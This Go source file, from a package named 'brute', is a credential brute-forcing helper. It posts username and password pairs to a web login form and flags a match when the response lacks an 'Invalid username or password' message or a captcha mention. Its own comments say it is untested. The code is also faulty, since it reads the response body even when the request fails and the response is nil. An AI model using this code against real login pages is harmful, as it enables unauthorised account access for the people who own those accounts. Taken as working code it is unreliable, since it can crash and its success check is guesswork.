package brute

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

func try(client *http.Client, u string, user string, pass string) *http.Response {
	v := url.Values{}
	v.Set("username", user)
	v.Set("password", pass)

	resp, err := client.PostForm(u, v)
	if err != nil {
		fmt.Println("Error trying user pass combination", err)
	}
	return resp
}

// tries combination of user:pass
// checks for redirect to find a matching combination this might not work!!!
// Very hard to test. SO untested
func Orca(Url string, user string, pass string) bool {
	resp := try(http.DefaultClient, Url, user, pass)

	Body, _ := io.ReadAll(resp.Body)

	if !strings.Contains(string(Body), "Invalid username or password") && !strings.Contains(string(Body), "captchas") {
		fmt.Println(string(Body))
		return true
	}
	return false
}
